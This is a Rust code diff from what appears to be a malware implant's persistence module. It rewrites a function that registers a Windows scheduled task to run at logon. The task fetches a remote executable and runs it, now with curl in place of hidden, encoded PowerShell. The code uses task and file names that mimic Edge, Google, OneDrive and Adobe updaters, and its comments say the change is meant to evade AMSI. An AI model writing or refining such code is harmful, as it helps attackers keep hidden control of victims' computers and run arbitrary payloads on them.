@@ -400,60 +400,40 @@ pub fn persist_wmi_memory_exec(_download_url: &str) -> Result<String, String> {
 /// - Task XML may be inspected by security tools
 #[cfg(target_os = "windows")]
 pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, String> {
-    debug_print!("[FILELESS] Setting up scheduled task download persistence...");
+    debug_print!("[FILELESS] Setting up scheduled task download persistence (curl LOLBin)...");
 
-    // Encode a PS script as base64 UTF-16LE to avoid shell-escaping issues
-    // when passed to schtasks /TR.
-    fn ps_to_b64(script: &str) -> String {
-        let bytes: Vec<u8> = script
-            .encode_utf16()
-            .flat_map(|c| c.to_le_bytes())
-            .collect();
-        const C: &[u8] =
-            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-        let mut out = String::new();
-        for ch in bytes.chunks(3) {
-            let b = [
-                ch[0],
-                if ch.len() > 1 { ch[1] } else { 0 },
-                if ch.len() > 2 { ch[2] } else { 0 },
-            ];
-            let n = ((b[0] as usize) << 16) | ((b[1] as usize) << 8) | b[2] as usize;
-            out.push(C[(n >> 18) & 63] as char);
-            out.push(C[(n >> 12) & 63] as char);
-            out.push(if ch.len() > 1 { C[(n >> 6) & 63] as char } else { '=' });
-            out.push(if ch.len() > 2 { C[n & 63] as char } else { '=' });
-        }
-        out
-    }
+    // Machine-derived index for polymorphic naming
+    let idx = {
+        let u = std::env::var("USERNAME").unwrap_or_default();
+        let c = std::env::var("COMPUTERNAME").unwrap_or_default();
+        u.bytes().chain(c.bytes())
+            .fold(0usize, |a, b| a.wrapping_mul(31).wrapping_add(b as usize))
+    };
 
-    // Polymorphic task names (machine-index picks one)
+    // Polymorphic task names that blend with Windows/software update tasks
     let task_names = [
         "MicrosoftEdgeUpdateService",
         "GoogleUpdateTaskMachineUA",
         "OneDriveStandaloneUpdaterTask",
         "AdobeAcrobatUpdateCheck",
     ];
-    // Use a simple machine-derived index without importing full get_machine_index
-    let idx = {
-        let u = std::env::var("USERNAME").unwrap_or_default();
-        u.bytes().fold(0usize, |a, b| a.wrapping_mul(31).wrapping_add(b as usize))
-            % task_names.len()
-    };
-    let task_name = task_names[idx];
+    let task_name = task_names[idx % task_names.len()];
 
-    // PS one-liner: download ester.exe to a temp file using a random GUID name, then execute.
-    // Uses native-EXE-compatible Start-Process – NOT dotnet Reflection::Load.
-    let ps_script = format!(
-        "$t=[IO.Path]::GetTempPath()+[Guid]::NewGuid().ToString('N')+'.exe';\
-(New-Object Net.WebClient).DownloadFile('{}','$t');\
-if(Test-Path $t){{Start-Process $t -WindowStyle Hidden}}",
-        download_url
-    );
-    let ps_b64 = ps_to_b64(&ps_script);
-    let ps_command = format!(
-        "powershell.exe -NoP -NonI -W Hidden -Ep Bypass -EncodedCommand {}",
-        ps_b64
+    // Polymorphic drop filenames that look like Windows components
+    let drop_names = [
+        "MsEdgeRedirect.exe",
+        "OneDriveUpdater.exe",
+        "GoogleUpdate.exe",
+        "AcrobatNotif.exe",
+    ];
+    let drop_name = drop_names[idx % drop_names.len()];
+
+    // Use curl.exe (ships with Windows 10 1803+) — no PowerShell, no AMSI.
+    // cmd /c is needed because schtasks /TR runs without a shell.
+    // The drop path uses %TEMP% which expands at task trigger time.
+    let task_cmd = format!(
+        "cmd.exe /c curl -s -L \"{}\" -o \"%TEMP%\\{}\" && start /min \"\" \"%TEMP%\\{}\"",
+        download_url, drop_name, drop_name
     );
 
     let schtasks_exe = obfstr!("schtasks").to_string();
@@ -470,7 +450,7 @@ if(Test-Path $t){{Start-Process $t -WindowStyle Hidden}}",
             "/Create",
             "/SC", "ONLOGON",
             "/TN", task_name,
-            "/TR", &ps_command,
+            "/TR", &task_cmd,
             "/F",
             "/RL", "LIMITED",
         ])
@@ -479,8 +459,8 @@ if(Test-Path $t){{Start-Process $t -WindowStyle Hidden}}",
         .map_err(|e| format!("Failed to create task: {}", e))?;
 
     if output.status.success() {
-        debug_print!("[FILELESS] Scheduled task download persistence established: {}", task_name);
-        Ok(format!("Fileless task '{}' → downloads from {}", task_name, download_url))
+        debug_print!("[FILELESS] schtask curl persistence established: {}", task_name);
+        Ok(format!("Fileless task '{}' curl → {}", task_name, download_url))
     } else {
         Err(format!(
             "Task creation failed: {}",
